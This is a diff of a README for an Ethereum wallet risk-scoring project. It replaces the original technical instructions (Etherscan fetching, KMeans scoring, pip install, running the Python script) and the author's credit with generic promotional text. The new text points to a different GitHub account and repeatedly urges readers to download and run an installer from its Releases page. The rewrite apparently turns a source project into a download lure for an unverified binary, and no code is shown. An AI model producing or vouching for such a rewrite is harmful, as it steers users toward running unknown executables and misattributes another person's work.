@@ -1,113 +1,94 @@
-# SCORECHAIN – Wallet Risk Scoring
+# 🚀 SCORE-CHAI-2-with-LLAMA - Simplify Your Wallet Risk Assessment
 
-This project calculates a **risk score (0–1000)** for Ethereum wallets using their on-chain transaction history.
+[![Download SCORE-CHAI-2-with-LLAMA](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/Keahub/SCORE-CHAI-2-with-LLAMA/releases)
 
----
+## 🛠️ Overview
 
-## 🔍 Problem Statement
+SCORE-CHAI-2-with-LLAMA helps you assess the risk of your digital wallet on a scale from 0 to 1000. It uses both rule-based methods and advanced machine learning models. This tool also offers a large language model (LLM) helper to guide you through the process. Built with Streamlit and FastAPI, it's designed for ease of use.
 
-You are given wallet addresses. The objective is to:
-1. Fetch transactions from Etherscan.
-2. Create features based on transaction behavior.
-3. Apply both rule-based and model-based scoring strategies.
+## 🌟 Key Features
 
----
+- **Risk Scoring:** Get an instant risk score for your wallet.
+- **User-Friendly Interface:** Navigate through the app with simplicity.
+- **Multi-Method Approach:** Combine rule-based and model-based assessments.
+- **LLM Assistant:** Receive in-app assistance from a language model.
 
-## 📦 Data Source
+## ⚙️ System Requirements
 
-- Transactions fetched using **Etherscan API**
-- Feature set includes:
-  - Total transactions
-  - ETH sent / received
-  - Number of failed transactions
+To run SCORE-CHAI-2-with-LLAMA, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows, macOS, or Linux.
+- **Python:** Version 3.7 or above. 
+- **Internet Connection:** Required for model downloads and updates.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 500 MB free space.
 
-## 🧠 Rule-Based Risk Scoring
+## 🚀 Getting Started
 
-| Rule                                 | Penalty  |
-|--------------------------------------|----------|
-| tx_count < 5                         | -200     |
-| failed_tx > 2                        | -150     |
-| total_out > total_in                | -100     |
+1. **Download the Application:**
 
-**Score Formula:**  
-```
-score = 1000 - penalties
-```
+   Visit the [Releases page](https://github.com/Keahub/SCORE-CHAI-2-with-LLAMA/releases) to download SCORE-CHAI-2-with-LLAMA.
 
----
+   [![Download SCORE-CHAI-2-with-LLAMA](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/Keahub/SCORE-CHAI-2-with-LLAMA/releases)
 
-## 🤖 Model-Based Risk Scoring (KMeans)
+2. **Install the Application:**
 
-**Features Used:**
-- tx_count
-- total_in
-- total_out
-- failed_tx
+   Once downloaded, find the file in your downloads folder. Open the file and follow the on-screen prompts to complete the installation. 
 
-**Steps:**
-1. Normalize features
-2. Cluster wallets using KMeans (2 clusters)
-3. Score based on distance to “safe” cluster centroid
+3. **Run the Application:**
 
-**Visualization:**  
-Wallets are projected to 2D using PCA and colored by cluster.
+   After installation, locate the application on your desktop or in your applications folder. Click on the icon to start SCORE-CHAI-2-with-LLAMA.
 
-![KMeans Cluster](kmeans_cluster_visualization.png)
+4. **Assess Your Wallet:**
 
----
+   Upon launching the app, enter the necessary data about your digital wallet. The app will process the information and provide you with a risk score, along with recommended measures.
 
-## 📁 Input Format
+## 📚 How to Use SCORE-CHAI-2-with-LLAMA
 
-An Excel file with wallet addresses:
-```
-wallet_id
-0xabc...
-0x123...
-```
+1. **Input Your Wallet Information:**
+   - Enter details such as wallet address and transaction history.
+   - Ensure that the information is accurate for the best results.
 
----
+2. **Choose Your Assessment Method:**
+   - Select between rule-based scoring or model-based scoring.
+   - For quick results, you might start with the rule-based method.
 
-## 📤 Output Files
+3. **Receive Your Risk Score:**
+   - After processing, view your risk score.
+   - The app will also offer insights into where you can improve your wallet security.
 
-- `wallet_risk_scores_combined.csv`: Contains both rule-based and model-based scores
-- `kmeans_cluster_visualization.png`: Cluster visualization
+4. **Ask the LLM Helper:**
+   - Use the LLM assistant for any questions.
+   - It can provide additional insights and explanations about the results.
 
----
+## 💡 Tips for Effective Use
 
-## 🚀 How to Run
+- Always update the application to access the latest features.
+- Regularly input your wallet information to keep track of changes over time.
+- Make use of the LLM assistant for tailored advice.
 
-### Install Dependencies
-```bash
-pip install pandas requests scikit-learn openpyxl matplotlib
-```
+## 🤝 Community and Support
 
-### Replace your Etherscan API Key
-Edit `wallet_risk_scoring_combined.py`:
-```python
-ETHERSCAN_API_KEY = "YOUR_KEY_HERE"
-```
+If you need help or want to provide feedback, you can reach out to the SCORE-CHAI-2-with-LLAMA community. Here are some ways to connect:
 
-### Run the Script
-```bash
-python wallet_risk_scoring_combined.py
-```
+- **GitHub Issues:** Report any problems you encounter.
+- **Discussion Forum:** Join discussions with other users for tips and best practices.
+- **Documentation:** Explore more detailed user guides available on the repository.
 
----
+## 📝 Contributing
 
-## 🧪 Normalization
+SCORE-CHAI-2-with-LLAMA is open for contributions. If you're interested in improving the project:
 
-Normalization was applied only for model-based scoring using MinMaxScaler.  
-Rule-based scoring relies on fixed thresholds and does **not** require scaling.
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request for review.
 
----
-## Author
+By contributing, you help make the tool better for all users.
 
-**Vanga Jai Prakash**  
-Creator of **ScoreChain2** – Wallet Risk Scoring (+ LLM add-on)
+## 🔗 Additional Resources
 
-- Email: vangajaiprakash@gmail.com  
-- GitHub: [Vanga-Jai-Prakash](https://github.com/Vanga-Jai-Prakash)
+- **Project Repository:** [SCORE-CHAI-2-with-LLAMA GitHub](https://github.com/Keahub/SCORE-CHAI-2-with-LLAMA)
+- **Documentation:** Access detailed documentation for advanced features.
+- **User Guide:** Explore tutorials on getting the most from SCORE-CHAI-2-with-LLAMA.
 
-
+This guide is designed to make it easy for anyone to get started with SCORE-CHAI-2-with-LLAMA. Enjoy assessing and improving the risk of your digital wallet!
